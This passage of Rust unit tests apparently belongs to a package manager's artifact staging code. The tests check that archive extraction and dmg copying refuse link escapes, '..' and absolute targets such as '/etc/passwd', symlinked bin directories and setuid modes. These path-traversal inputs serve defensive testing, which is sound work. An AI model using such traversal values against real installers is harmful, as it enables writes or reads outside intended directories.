    /// The `tar-zst`, `tar-gz` and `zip` vendor lanes lay the SAME tree from the same
    /// shape — top level stripped, modes sanitized, the hardlink an alias of its bytes,
    /// the symlink's target verbatim — and fold the root a hand-laid replica walks to:
    /// the signed root each stage verifies against.
    #[cfg(unix)]
    #[test]
    fn every_vendor_archive_lane_stages_with_strip_components() {
        let d = tmp("vendor-archives");
        let expected = gh_expected_root(&d);
        let zst = d.join("gh.tar.zst");
        std::fs::write(&zst, crate::extract::fixtures::zstd_bytes(&gh_tar())).unwrap();
        let gz = d.join("gh.tar.gz");
        std::fs::write(&gz, gzip_bytes(&gh_tar())).unwrap();
        let zip = d.join("gh.zip");
        std::fs::write(&zip, gh_zip()).unwrap();
        for (archive, payload) in [(&zst, "tar-zst"), (&gz, "tar-gz"), (&zip, "zip")] {
            let mut art = vendor_artifact(archive, payload, &expected);
            art.strip_components = 1;
            let build = d.join(format!("store/gh-{payload}/18"));
            verify_and_stage(&art, archive, &build, &StageHooks::NONE)
                .unwrap_or_else(|e| panic!("{payload}: {e}"));
            assert!(crate::store::build_is_complete(&build), "{payload}");
        }
    }

    /// The `raw-binary` lane: the download becomes `bin/<entry>` at `0755`, folding the
    /// root a hand-laid `bin/<entry>` walks to, with or without a `links` alias beside it
    /// (laid in the `bin` the lane made, which `apply_links` takes only because the lane
    /// recorded it in the fold: a `bin` made behind the fold's back is refused as
    /// Occupied). An `entry` that is not a bare tool name is refused before anything is
    /// written.
    #[cfg(unix)]
    #[test]
    fn raw_binary_payload_becomes_bin_entry_at_0755() {
        let d = tmp("vendor-raw");
        let payload: Vec<u8> = (0..300_000usize).map(|i| (i % 253) as u8).collect();
        let dl = d.join("claude-2.1.231-darwin-arm64");
        std::fs::write(&dl, &payload).unwrap();
        let replica = d.join("replica");
        lay(&replica, "bin/claude", &payload, 0o755);
        let plain = tree_root(&replica).unwrap();
        lay_link(&replica, "bin/claude-alias", "../bin/claude");
        let aliased = tree_root(&replica).unwrap();
        for (label, expected, alias) in [("plain", &plain, false), ("alias", &aliased, true)] {
            let mut art = vendor_artifact(&dl, "raw-binary", expected);
            art.entry = "claude".into();
            if alias {
                art.links.insert("claude-alias".into(), "bin/claude".into());
            }
            let build = d.join(format!("store/claude-{label}/2026082601"));
            verify_and_stage(&art, &dl, &build, &StageHooks::NONE)
                .unwrap_or_else(|e| panic!("{label}: {e}"));
        }
        for bad in ["", "bin/claude", "../claude", "sudo"] {
            let mut art = vendor_artifact(&dl, "raw-binary", &plain);
            art.entry = bad.into();
            let build = d.join("store/bad/1");
            let err = verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap_err();
            assert!(matches!(err, StageError::Payload(_)), "{bad:?}: {err:?}");
            assert!(!build.exists(), "{bad:?}");
        }
    }

    /// The `tar-gz-binary` lane on agy's shape (one regular file `antigravity` at the archive
    /// root) stages it as `bin/agy` at `0755`, a `0644` member too, to the root a hand-laid
    /// `bin/agy` walks to, and the Developer ID gate asks about `bin/agy` as the one Mach-O.
    #[cfg(unix)]
    #[test]
    fn a_one_member_tar_gz_binary_stages_its_file_at_bin_entry_0755() {
        let d = tmp("vendor-tgzbin");
        let mut body = thin_macho();
        body.extend((0..300_000usize).map(|i| (i % 251) as u8));
        let replica = d.join("replica");
        lay(&replica, "bin/agy", &body, 0o755);
        let expected = tree_root(&replica).unwrap();
        for member_mode in [0o755, 0o644] {
            let gz = d.join(format!("agy-1.3.6-{member_mode:o}.tar.gz"));
            let tar = tar_bytes(&[("antigravity", b'0', "", &body, member_mode)]);
            std::fs::write(&gz, gzip_bytes(&tar)).unwrap();
            let mut art = vendor_artifact(&gz, "tar-gz-binary", "");
            art.entry = "agy".into();
            let asked = std::cell::RefCell::new(Vec::new());
            let verify = |path: &Path, _: std::time::Instant| {
                asked.borrow_mut().push(path.to_path_buf());
                Ok::<(), aterm_update_core::codesign::CodesignError>(())
            };
            let gate =
                |tree: &Path| check_developer_id(tree, "EQHXZ8M8AV", &["agy".into()], &verify);
            let hooks = StageHooks {
                pre_swap: Some(&gate),
                sidecars: None,
                aliases: &[],
            };
            let build = d.join(format!("store/agy-{member_mode:o}/1000001000003000006"));
            let root = verify_and_stage(&art, &gz, &build, &hooks).unwrap();
            assert_eq!(root, expected, "{member_mode:o}: bin/agy at 0755");
            let asked = asked.into_inner();
            assert!(
                asked.len() == 1 && asked[0].ends_with("bin/agy"),
                "{asked:?}"
            );
        }
    }

    /// A single-binary build's `bin/` is sealed `0555` on both lanes, so agy's own updater
    /// (which writes `agy.<nanos>.old` beside the binary) cannot write there, and every
    /// removal still takes it: a re-stage's swap, `discard_build` and `uninstall`. The
    /// control: a plain `remove_dir_all` of the sealed tree fails.
    #[cfg(unix)]
    #[test]
    fn a_single_binary_builds_bin_is_sealed_and_every_removal_still_takes_it() {
        use std::os::unix::fs::PermissionsExt as _;
        let d = tmp("vendor-sealed");
        let layout = crate::store::Layout {
            prefix: d.to_path_buf(),
        };
        let body: Vec<u8> = (0..4096usize).map(|i| (i % 251) as u8).collect();
        let raw = d.join("agy-raw");
        std::fs::write(&raw, &body).unwrap();
        let gz = d.join("agy.tar.gz");
        let tar = tar_bytes(&[("antigravity", b'0', "", &body, 0o755)]);
        std::fs::write(&gz, gzip_bytes(&tar)).unwrap();
        let bin_mode = |build: &Path| {
            std::fs::metadata(build.join("bin"))
                .unwrap()
                .permissions()
                .mode()
                & 0o7777
        };
        for (n, (payload, dl)) in [("raw-binary", &raw), ("tar-gz-binary", &gz)]
            .into_iter()
            .enumerate()
        {
            let mut art = vendor_artifact(dl, payload, "");
            art.entry = "agy".into();
            let build = layout.build_dir("agy", n as u64 + 1);
            let root = verify_and_stage(&art, dl, &build, &StageHooks::NONE).unwrap();
            assert_eq!(bin_mode(&build), 0o555, "{payload}");
            assert_eq!(tree_root(&build).unwrap(), root, "{payload}: no root moved");
            let write = std::fs::write(build.join("bin/agy.1792104288627296000.old"), b"x");
            assert_eq!(
                write.map_err(|e| e.kind()),
                Err(std::io::ErrorKind::PermissionDenied),
                "{payload}"
            );
            // A re-stage over the sealed build (repair): the old tree is retired and gone.
            verify_and_stage(&art, dl, &build, &StageHooks::NONE).unwrap();
            assert!(scratch_beside(&build).is_empty(), "{payload}");
            assert!(
                std::fs::remove_dir_all(&build).is_err(),
                "{payload}: control"
            );
            crate::store::discard_build(&build);
            assert!(!build.exists(), "{payload}: discard takes the sealed tree");
            verify_and_stage(&art, dl, &build, &StageHooks::NONE).unwrap();
        }
        crate::ops::uninstall(&layout, "agy").unwrap();
        assert!(!layout.prefix.join("store/agy").exists());
    }

    /// Every `tar-gz-binary` that is not exactly one regular file at the archive root is
    /// refused and leaves no build, marker or scratch: a second member, a link (any kind
    /// not a regular file), a nested, dotted or backslashed name, an empty archive, a
    /// member past the signed size cap, and a gzip that is not one or is cut short. The
    /// control: a member of exactly the cap stages.
    #[cfg(unix)]
    #[test]
    fn a_tar_gz_binary_that_is_not_one_root_file_is_refused() {
        use crate::extract::{ExtractError, ExtractReject as R, TooLargeReason};
        #[derive(Debug)]
        enum Refusal {
            Rejected(R, &'static str),
            ContentCap,
            Io,
        }
        let d = tmp("vendor-tgzbin-bad");
        let body = thin_macho();
        let cap = size_cap(&artifact("", ""));
        let at_cap = vec![7u8; usize::try_from(cap).unwrap()];
        let past_cap = vec![7u8; at_cap.len() + 1];
        let file = |name| (name, b'0', "", &body[..], 0o755);
        let one = gzip_bytes(&tar_bytes(&[file("antigravity")]));
        let cases = [
            (
                "two members",
                tar_bytes(&[file("antigravity"), file("LICENSE")]),
                Refusal::Rejected(R::NotSingleFile, "LICENSE"),
            ),
            (
                "a symlink",
                tar_bytes(&[("antigravity", b'2', "/bin/sh", b"", 0o777)]),
                Refusal::Rejected(R::DisallowedKind, "antigravity"),
            ),
            (
                "a hard link",
                tar_bytes(&[("antigravity", b'1', "agy", b"", 0o755)]),
                Refusal::Rejected(R::DisallowedKind, "antigravity"),
            ),
            (
                "a nested name",
                tar_bytes(&[file("dir/antigravity")]),
                Refusal::Rejected(R::NotSingleFile, "dir/antigravity"),
            ),
            (
                "a dotted name",
                tar_bytes(&[file("./antigravity")]),
                Refusal::Rejected(R::NotSingleFile, "./antigravity"),
            ),
            (
                "a backslashed name",
                tar_bytes(&[file("antigravity\\x")]),
                Refusal::Rejected(R::NotSingleFile, "antigravity\\x"),
            ),
            (
                "an empty archive",
                tar_bytes(&[]),
                Refusal::Rejected(R::NotSingleFile, ""),
            ),
            (
                "a member past the cap",
                tar_bytes(&[("antigravity", b'0', "", &past_cap, 0o755)]),
                Refusal::ContentCap,
            ),
        ]
        .map(|(label, tar, want)| (label, gzip_bytes(&tar), want))
        .into_iter()
        .chain([
            (
                "a tar that is not gzipped",
                tar_bytes(&[file("antigravity")]),
                Refusal::Io,
            ),
            (
                "a gzip cut short",
                one[..one.len() / 2].to_vec(),
                Refusal::Io,
            ),
        ]);
        for (i, (label, bytes, want)) in cases.enumerate() {
            let dl = d.join(format!("{i}.tar.gz"));
            std::fs::write(&dl, bytes).unwrap();
            let mut art = vendor_artifact(&dl, "tar-gz-binary", "");
            art.entry = "agy".into();
            let build = d.join(format!("store/agy-{i}/1"));
            let Err(StageError::Extract(e)) =
                verify_and_stage(&art, &dl, &build, &StageHooks::NONE)
            else {
                panic!("{label}: not an extract refusal");
            };
            let met = match (&want, &e) {
                (Refusal::Rejected(why, path), ExtractError::Rejected(r, p)) => {
                    r == why && p == Path::new(path)
                }
                (Refusal::ContentCap, ExtractError::TooLarge(TooLargeReason::ContentCap))
                | (Refusal::Io, ExtractError::Io { .. }) => true,
                _ => false,
            };
            assert!(met, "{label}: want {want:?}, got {e}");
            assert!(!build.exists(), "{label}");
            assert!(scratch_beside(&build).is_empty(), "{label}");
        }
        let dl = d.join("at-cap.tar.gz");
        let tar = tar_bytes(&[("antigravity", b'0', "", &at_cap, 0o755)]);
        std::fs::write(&dl, gzip_bytes(&tar)).unwrap();
        let mut art = vendor_artifact(&dl, "tar-gz-binary", "");
        art.entry = "agy".into();
        let build = d.join("store/agy-at-cap/1");
        verify_and_stage(&art, &dl, &build, &StageHooks::NONE).unwrap();
        assert_eq!(std::fs::read(build.join("bin/agy")).unwrap(), at_cap);
    }

    /// `apply_links` runs `create_dir_all(bin)` + `chmod 0755 bin` and then creates
    /// `bin/<name>` — all of which FOLLOW a `bin` that is a symlink. A staged `bin` (or a
    /// link target's ancestor) that is a symlink must be refused before any of it, so
    /// nothing outside the stage is chmodded or gets a link planted in it, however the
    /// symlink was laid (an archive's own chain of links is the extractor's refusal:
    /// `extract`'s `a_chain_of_in_root_symlinks_cannot_escape_the_root`).
    #[cfg(unix)]
    #[test]
    fn apply_links_never_writes_through_a_staged_bin_symlink() {
        use std::os::unix::fs::PermissionsExt as _;
        let d = tmp("links-bin-symlink");
        let victim = d.join("victim");
        std::fs::create_dir_all(&victim).unwrap();
        std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o700)).unwrap();
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;

        let dest = d.join("direct");
        lay(&dest, "gh-real", b"#!/bin/sh\n", 0o755);
        std::os::unix::fs::symlink(&victim, dest.join("bin")).unwrap();
        let mut links = BTreeMap::new();
        links.insert("gh".to_string(), "gh-real".to_string());
        let err = apply_links(&dest, &links, None).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(std::fs::symlink_metadata(victim.join("gh")).is_err());
        assert_eq!(
            mode(&victim),
            0o700,
            "the outside directory was not chmodded"
        );

        // … and so is a target reached through a symlinked ancestor, whose existence
        // probe would otherwise be answered from outside the stage.
        let dest = d.join("ancestor");
        std::fs::create_dir_all(&dest).unwrap();
        std::fs::write(victim.join("tool"), b"x").unwrap();
        std::os::unix::fs::symlink(&victim, dest.join("lib")).unwrap();
        let mut links = BTreeMap::new();
        links.insert("tool".to_string(), "lib/tool".to_string());
        let err = apply_links(&dest, &links, None).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(std::fs::symlink_metadata(dest.join("bin/tool")).is_err());
    }

    /// `links` lay RELATIVE symlinks `bin/<name> -> ../<target>` after extraction and
    /// fold into the root exactly as the walk of a hand-laid replica reads them. A
    /// dangling, `..` or absolute target, a name that is not a tool name, and a name that
    /// collides with an extracted entry are each refused with nothing staged.
    #[cfg(unix)]
    #[test]
    fn links_lay_relative_symlinks_under_bin_and_fold_into_the_root() {
        let d = tmp("vendor-links");
        let gz = d.join("emacs.tar.gz");
        std::fs::write(
            &gz,
            gzip_bytes(&tar_bytes(&[
                (
                    "Emacs.app/Contents/MacOS/Emacs",
                    b'0',
                    "",
                    b"#!/bin/sh\necho emacs\n",
                    0o755,
                ),
                (
                    "Emacs.app/Contents/MacOS/bin/emacsclient",
                    b'0',
                    "",
                    b"#!/bin/sh\necho client\n",
                    0o755,
                ),
                ("bin/taken", b'0', "", b"already here", 0o644),
            ])),
        )
        .unwrap();
        let replica = d.join("replica");
        lay(
            &replica,
            "Emacs.app/Contents/MacOS/Emacs",
            b"#!/bin/sh\necho emacs\n",
            0o755,
        );
        lay(
            &replica,
            "Emacs.app/Contents/MacOS/bin/emacsclient",
            b"#!/bin/sh\necho client\n",
            0o755,
        );
        lay(&replica, "bin/taken", b"already here", 0o644);
        lay_link(&replica, "bin/emacs", "../Emacs.app/Contents/MacOS/Emacs");
        lay_link(
            &replica,
            "bin/emacsclient",
            "../Emacs.app/Contents/MacOS/bin/emacsclient",
        );
        let expected = tree_root(&replica).unwrap();

        let mut art = vendor_artifact(&gz, "tar-gz", &expected);
        art.links
            .insert("emacs".into(), "Emacs.app/Contents/MacOS/Emacs".into());
        art.links.insert(
            "emacsclient".into(),
            "Emacs.app/Contents/MacOS/bin/emacsclient".into(),
        );
        verify_and_stage(&art, &gz, &d.join("store/emacs/18"), &StageHooks::NONE).unwrap();

        let refused: &[(&str, &str, &str)] = &[
            ("dangling", "emacs", "Emacs.app/Contents/MacOS/Nope"),
            ("dotdot", "emacs", "../outside"),
            (
                "absolute",
                "emacs",
                "/Applications/Emacs.app/Contents/MacOS/Emacs",
            ),
            ("collides", "taken", "Emacs.app/Contents/MacOS/Emacs"),
            ("bad-name", "bin/emacs", "Emacs.app/Contents/MacOS/Emacs"),
        ];
        for (label, name, target) in refused {
            let mut art = vendor_artifact(&gz, "tar-gz", &expected);
            art.links.insert((*name).into(), (*target).into());
            let build = d.join(format!("store/{label}/18"));
            let err = verify_and_stage(&art, &gz, &build, &StageHooks::NONE).unwrap_err();
            assert!(matches!(err, StageError::Payload(_)), "{label}: {err:?}");
            assert!(!build.exists(), "{label}: nothing staged");
            assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
        }
    }

    /// The root a stage hands back is the walk of the tree it leaves, whatever the
    /// filesystem folds. A vendor-direct build records exactly this root (no index signed
    /// one) and `aterm pkg verify` walks the build against it, so a stage that recorded
    /// `dir/g` over a disk holding `Dir/g` — one directory under two spellings on
    /// case-insensitive APFS — left an install that read as drifted from the moment it
    /// landed. The archive's own members are the extractor's to hold to it
    /// (`extract`'s `a_directory_the_filesystem_names_like_another_never_merges_unseen`);
    /// the `links` a stage adds under `bin/` over an archive that laid `Bin/` are held here:
    /// where the filesystem keeps the spellings apart both stage and agree, where it folds
    /// them the stage is refused with nothing left behind, and spelled one way they stage.
    #[cfg(unix)]
    #[test]
    fn a_staged_root_is_the_walk_of_the_tree_it_leaves_when_names_fold() {
        /// `(label, tar entries, links, spelled one way)`.
        type Case<'a> = (
            &'a str,
            &'a [(&'a str, u8, &'a str, &'a [u8], u32)],
            &'a [(&'a str, &'a str)],
            bool,
        );
        let d = tmp("folded-names");
        let cases: &[Case<'_>] = &[
            (
                "links",
                &[("Bin/tool", b'0', "", b"#!/bin/sh\n", 0o755)],
                &[("t", "Bin/tool")],
                false,
            ),
            (
                "links-exact",
                &[("bin/tool", b'0', "", b"#!/bin/sh\n", 0o755)],
                &[("t", "bin/tool")],
                true,
            ),
        ];
        for (label, entries, links, exact) in cases {
            let gz = d.join(format!("{label}.tar.gz"));
            std::fs::write(&gz, gzip_bytes(&tar_bytes(entries))).unwrap();
            let mut art = vendor_artifact(&gz, "tar-gz", "");
            for (name, target) in *links {
                art.links.insert((*name).into(), (*target).into());
            }
            let build = d.join(format!("store/{label}/1"));
            match verify_and_stage(&art, &gz, &build, &StageHooks::NONE) {
                Ok(root) => assert_eq!(
                    tree_root(&build).unwrap(),
                    root,
                    "{label}: the recorded root is the installed tree's"
                ),
                Err(StageError::Extract(ExtractError::Rejected(
                    crate::extract::ExtractReject::Occupied,
                    _,
                ))) if !exact => {
                    assert!(!build.exists(), "{label}: nothing staged");
                    assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
                }
                Err(e) => panic!("{label}: {e:?}"),
            }
        }
    }

    /// `hdiutil info`'s report, parsed: the block a failed attach leaves (the image attached,
    /// every entity mounted nowhere) is a carcass with a device node to eject, while an image
    /// mounted anywhere but our mount point is left alone. `hdiutil attach` can exit non-zero
    /// having already attached the image, and only the report shows it.
    #[cfg(target_os = "macos")]
    #[test]
    fn a_failed_attach_leaves_a_carcass_the_hdiutil_report_names() {
        const REPORT: &str = "framework       : 683.160.3
driver          : 683.160.3
images          : 3
================================================
image-path      : /Users//someone/Downloads/aterm-0.81.0.dmg
image-alias     : /Users//someone/Downloads/aterm-0.81.0.dmg
image-type      : read-only disk image
/dev/disk4\tGUID_partition_scheme\t
/dev/disk4s1\t48465300-0000-11AA-AA11-00306543ECAC\t/Volumes/aterm 0.81.0
================================================
image-path      : /tmp/stage/foo.dmg
image-alias     : /tmp/stage/foo.dmg
image-type      : UDIF read-only [write once]
/dev/disk5\tGUID_partition_scheme\t
/dev/disk5s1\t7C3457EF-0000-11AA-AA11-00306543ECAC\t
/dev/disk6\tEF57347C-0000-11AA-AA11-00306543ECAC\t
/dev/disk6s1\t41504653-0000-11AA-AA11-00306543ECAC\t
================================================
image-path      : /tmp/stage/bar.dmg
image-alias     : /tmp/stage/bar.dmg
/dev/disk7\tGUID_partition_scheme\t
/dev/disk7s1\t41504653-0000-11AA-AA11-00306543ECAC\t/tmp/stage/bar.mnt
";
        let all = parse_hdiutil_info(REPORT);
        assert_eq!(all.len(), 3, "one entry per attached image");
        assert_eq!(all[0].node, Path::new("/dev/disk4"));
        assert_eq!(
            all[0].mounted_at,
            vec![PathBuf::from("/Volumes/aterm 0.81.0")],
            "a mount point may hold spaces; the fields are tab-separated"
        );
        assert_eq!(
            all[1].node,
            Path::new("/dev/disk5"),
            "the image's OWN node, not the synthesised APFS container's"
        );
        assert!(
            all[1].mounted_at.is_empty(),
            "the carcass is attached and mounted nowhere: {:?}",
            all[1].mounted_at
        );

        let mine = |image: &str, point: &str| Mount {
            image: PathBuf::from(image),
            point: PathBuf::from(point),
            // Never armed: these guards must not shell out when they drop.
            attached: false,
        };
        assert_eq!(
            mine("/tmp/stage/foo.dmg", "/tmp/stage/foo.mnt").reclaimable(REPORT),
            vec![PathBuf::from("/dev/disk5")],
            "the carcass of OUR image is ours to eject"
        );
        assert_eq!(
            mine("/tmp/stage/bar.dmg", "/tmp/stage/bar.mnt").reclaimable(REPORT),
            vec![PathBuf::from("/dev/disk7")],
            "so is an image mounted at our own mount point"
        );
        assert!(
            mine(
                "/Users//someone/Downloads/aterm-0.81.0.dmg",
                "/tmp/stage/x.mnt"
            )
            .reclaimable(REPORT)
            .is_empty(),
            "an image the user has mounted elsewhere is NOT ours to yank"
        );
        assert!(
            mine("/tmp/stage/other.dmg", "/tmp/stage/other.mnt")
                .reclaimable(REPORT)
                .is_empty(),
            "an image we never attached is never touched"
        );
    }

    /// The bytes of an image a [`StandIn`] stands in for: the row's digest is over them, and
    /// no arm reads them.
    #[cfg(target_os = "macos")]
    fn stand_in_bytes(_src: &Path, image: &Path) -> std::io::Result<()> {
        std::fs::write(image, b"a scratch folder stands in for this image")
    }

    /// A scratch folder standing in for a mounted disk image ([`attach_image`]): `root` is
    /// what the stage reads as the image's root, and its release is written to `log`:
    /// `detach` for the stage's explicit one, `dropped` for its guard's on an error path.
    #[cfg(target_os = "macos")]
    struct StandIn {
        root: PathBuf,
        log: std::rc::Rc<std::cell::RefCell<Vec<&'static str>>>,
        released: bool,
    }

    #[cfg(target_os = "macos")]
    impl Attached for StandIn {
        fn root(&self) -> &Path {
            &self.root
        }

        fn detach(&mut self) -> Result<(), StageError> {
            self.released = true;
            self.log.borrow_mut().push("detach");
            Ok(())
        }
    }

    #[cfg(target_os = "macos")]
    impl Drop for StandIn {
        fn drop(&mut self) {
            if !self.released {
                self.log.borrow_mut().push("dropped");
            }
        }
    }

    /// Run `f` with every image this thread attaches stood in for by the folder `root`
    /// ([`StandIn`]): what `f` answered, and each attach and release in order.
    #[cfg(target_os = "macos")]
    fn standing_in<R>(root: &Path, f: impl FnOnce() -> R) -> (R, Vec<&'static str>) {
        let log = std::rc::Rc::new(std::cell::RefCell::new(Vec::new()));
        let (root, arm_log) = (root.to_path_buf(), std::rc::Rc::clone(&log));
        let out = image_arm::with(
            Box::new(move |_, _| {
                arm_log.borrow_mut().push("attach");
                Ok(Box::new(StandIn {
                    root: root.clone(),
                    log: std::rc::Rc::clone(&arm_log),
                    released: false,
                }))
            }),
            f,
        );
        let events = log.borrow().clone();
        (out, events)
    }

    /// The `dmg` lane over a scratch folder standing in for the mounted image
    /// ([`standing_in`]; a default test run attaches no disk image, [`attach_image`]):
    /// around [`foo_app_image`]'s `Foo.app`, the stage copies ONLY the bundle, keeps its
    /// links, lays the row's `links`, gives every file the archive lanes' mode and no ACL,
    /// releases the image explicitly once the copy is vetted, and the root equals the walk
    /// of the replica. The same stage of a real image, attach and detach included, is
    /// the explicit `dmg_acceptance` bench. The picker's other refusals
    /// and the link rule's other shapes are pure functions of a directory, proved by
    /// [`dmg_picker_refuses_anything_but_exactly_one_real_app`] and
    /// [`dmg_link_vet_admits_an_in_root_climb_and_refuses_an_escape`].
    #[cfg(target_os = "macos")]
    #[test]
    fn dmg_app_payload_stages_the_single_app_and_its_links() {
        let d = tmp("vendor-dmg");
        let (src, dmg) = (d.join("src"), d.join("foo.dmg"));
        let art = foo_app_image(&d, &src, &dmg, stand_in_bytes).unwrap();
        let build = d.join("store/foo/2026082601");
        let (staged, events) = standing_in(&src, || {
            verify_and_stage(&art, &dmg, &build, &StageHooks::NONE)
        });
        // The signed root is the sanitized replica's: only the bundle copied, its links
        // (the `..` climb included) laid verbatim, every file at the archive lanes' mode.
        staged.unwrap();
        assert!(
            !has_acl(&build.join("Foo.app/Contents/Resources/acl")),
            "no ACL on the image reaches the store"
        );
        assert_eq!(events, ["attach", "detach"], "released once, explicitly");
    }

    /// An image with no `.app` at the root, over a stand-in folder: refused by the picker,
    /// released by the guard's `Drop`, nothing staged. (Two apps is the same refusal from
    /// the same picker; see [`dmg_picker_refuses_anything_but_exactly_one_real_app`].) The
    /// real image's refusal and detach runs in the explicit `dmg_acceptance` bench.
    #[cfg(target_os = "macos")]
    #[test]
    fn a_dmg_with_no_app_is_refused_and_detached() {
        let d = tmp("vendor-dmg-none");
        let src = d.join("src-none");
        lay(&src, "README.txt", b"r", 0o644);
        let dmg = d.join("none.dmg");
        stand_in_bytes(&src, &dmg).unwrap();
        let art = vendor_artifact(&dmg, "dmg", &tree_root(&src).unwrap());
        let build = d.join("store/none/1");
        let (staged, events) = standing_in(&src, || {
            verify_and_stage(&art, &dmg, &build, &StageHooks::NONE)
        });
        let err = staged.unwrap_err();
        assert!(matches!(err, StageError::DmgAppCount(0)), "{err:?}");
        assert!(!build.exists());
        assert!(scratch_beside(&build).is_empty());
        assert_eq!(events, ["attach", "dropped"], "released on the error path");
    }

    /// A bundle with a link out of the stage, over a stand-in folder: the copy is made, the
    /// stage's post-copy vet refuses it naming the link, the image is released once and
    /// nothing is staged. (The link rule's other shapes are
    /// [`dmg_link_vet_admits_an_in_root_climb_and_refuses_an_escape`].)
    #[cfg(target_os = "macos")]
    #[test]
    fn a_dmg_whose_bundle_links_out_is_refused_naming_the_link_and_released() {
        let d = tmp("vendor-dmg-escape");
        let src = d.join("src-escape");
        lay(
            &src,
            "Bad.app/Contents/MacOS/x",
            b"#!/bin/sh\nexit 0\n",
            0o755,
        );
        lay_link(
            &src,
            "Bad.app/Contents/Resources/out",
            "../../../../outside",
        );
        let dmg = d.join("escape.dmg");
        stand_in_bytes(&src, &dmg).unwrap();
        let art = vendor_artifact(&dmg, "dmg", &tree_root(&src).unwrap());
        let build = d.join("store/escape/1");
        let (staged, events) = standing_in(&src, || {
            verify_and_stage(&art, &dmg, &build, &StageHooks::NONE)
        });
        match staged {
            Err(StageError::Extract(ExtractError::Rejected(_, link))) => {
                assert_eq!(link, Path::new("Bad.app/Contents/Resources/out"));
            }
            other => panic!("the vet refuses the link: {other:?}"),
        }
        assert!(!build.exists());
        assert!(scratch_beside(&build).is_empty());
        assert!(
            matches!(events.as_slice(), ["attach", "detach" | "dropped"]),
            "released exactly once: {events:?}"
        );
    }

    /// The dmg lane's `.app` picker over a plain directory: exactly one real `.app` directory
    /// is picked whatever else sits beside it (a README, an `Applications` link, a link that
    /// merely names an app), and zero or two are refused with the count.
    #[cfg(target_os = "macos")]
    #[test]
    fn dmg_picker_refuses_anything_but_exactly_one_real_app() {
        let d = tmp("dmg-picker");
        let one = d.join("one");
        lay(&one, "Foo.app/Contents/MacOS/foo", b"x", 0o755);
        lay(&one, "README.txt", b"r", 0o644);
        lay_link(&one, "Applications", "/Applications");
        lay_link(&one, "Alias.app", "Foo.app");
        assert_eq!(single_app_in(&one).unwrap(), one.join("Foo.app"));

        for (label, apps) in [("two", &["A.app", "B.app"][..]), ("none", &[][..])] {
            let root = d.join(label);
            for app in apps {
                lay(&root, &format!("{app}/Contents/MacOS/x"), b"x", 0o755);
            }
            lay(&root, "README.txt", b"r", 0o644);
            let err = single_app_in(&root).unwrap_err();
            assert!(
                matches!(err, StageError::DmgAppCount(count) if count == apps.len()),
                "{label}: {err:?}"
            );
        }
    }

    /// The dmg lane's post-copy link vet over a plain directory laid like a stage root
    /// holding a copied bundle: a `..` climb that stays inside the root (frameworks do
    /// that) is admitted, and one that climbs above it is an extraction-class rejection
    /// naming the link. The real-image half is the admission in
    /// `dmg_app_payload_stages_the_single_app_and_its_links` (the success image's
    /// `Resources/up` climb, laid verbatim and swapped in); a refusal after the copy
    /// detaches as every refusal does, through the `Mount` guard
    /// (`a_dmg_with_no_app_is_refused_and_detached`).
    #[cfg(target_os = "macos")]
    #[test]
    fn dmg_link_vet_admits_an_in_root_climb_and_refuses_an_escape() {
        let d = tmp("dmg-link-vet");
        for (label, target, ok) in [
            ("up-link", "../../../../outside", false),
            ("in-root-link", "../../Bad.app/Contents/MacOS/x", true),
            ("abs-link", "/etc/passwd", false),
        ] {
            let root = d.join(label);
            lay(
                &root,
                "Bad.app/Contents/MacOS/x",
                b"#!/bin/sh\nexit 0\n",
                0o755,
            );
            lay_link(&root, "Bad.app/Contents/Resources/escape", target);
            match vet_copied_tree(&root, &root.join("Bad.app")) {
                Ok(()) => assert!(ok, "{label}: an escaping link was admitted"),
                Err(StageError::Extract(ExtractError::Rejected(_, link))) if !ok => assert_eq!(
                    link,
                    Path::new("Bad.app/Contents/Resources/escape"),
                    "{label}"
                ),
                Err(e) => panic!("{label}: {e:?}"),
            }
        }
    }

    /// AT3 (2026-10-10): the dmg lane's post-copy walk gives the copied bundle the
    /// archive lanes' modes ([`crate::extract::safe_mode`]), over a plain directory laid
    /// the way `ditto` lays an image's bundle when it runs as root (it keeps setuid and
    /// setgid only then, ditto(1); an unprivileged run drops them, and sticky, itself):
    /// a setuid executable, a sticky world-writable directory, a group-writable one, a
    /// world-writable file and an owner-only read-only one, under an owner-only bundle
    /// directory, and the flags `ditto` copies at any privilege: an immutable (`uchg`)
    /// world-writable file, an append-only (`uappnd`) one and an immutable directory.
    /// Every regular file comes out `0755` (any `x` bit) or `0644` and every directory
    /// `0755`, the bundle's own included, with no immutable or append-only flag; a link
    /// is left as it is. The real-image half is
    /// [`dmg_app_payload_stages_the_single_app_and_its_links`].
    #[cfg(target_os = "macos")]
    #[test]
    fn dmg_copy_walk_gives_the_bundle_the_archive_lanes_modes() {
        use std::os::unix::fs::PermissionsExt as _;
        /// `(path, contents, mode as copied, mode admitted)`.
        const FILES: &[(&str, &[u8], u32, u32)] = &[
            ("Foo.app/Contents/MacOS/foo", b"#!/bin/sh\n", 0o4755, 0o755),
            ("Foo.app/Contents/Resources/shared", b"w", 0o666, 0o644),
            ("Foo.app/Contents/Resources/sealed", b"r", 0o400, 0o644),
            ("Foo.app/Contents/Resources/locked", b"l", 0o666, 0o644),
            ("Foo.app/Contents/Resources/pinned", b"p", 0o644, 0o644),
            (
                "Foo.app/Contents/Plugins/helper",
                b"#!/bin/sh\n",
                0o771,
                0o755,
            ),
        ];
        /// `(directory, mode as copied)`; every one is admitted `0755`.
        const DIRS: &[(&str, u32)] = &[
            ("Foo.app/Contents/Plugins", 0o1777),
            ("Foo.app/Contents", 0o775),
            ("Foo.app", 0o700),
        ];
        /// `(entry, chflags(1) flag as copied)`; none is admitted.
        const FLAGGED: &[(&str, &str)] = &[
            ("Foo.app/Contents/Resources/locked", "uchg"),
            ("Foo.app/Contents/Resources/pinned", "uappnd"),
            ("Foo.app/Contents/Plugins", "uchg"),
        ];
        /// Clears every flag under the scratch dir however the test ends, so its removal
        /// is never refused.
        struct Unflag<'a>(&'a Path);
        impl Drop for Unflag<'_> {
            fn drop(&mut self) {
                let _ = aterm_uds::spawnfd::command("/usr/bin/chflags")
                    .arg("-R")
                    .arg("nouchg,nouappnd")
                    .arg(self.0)
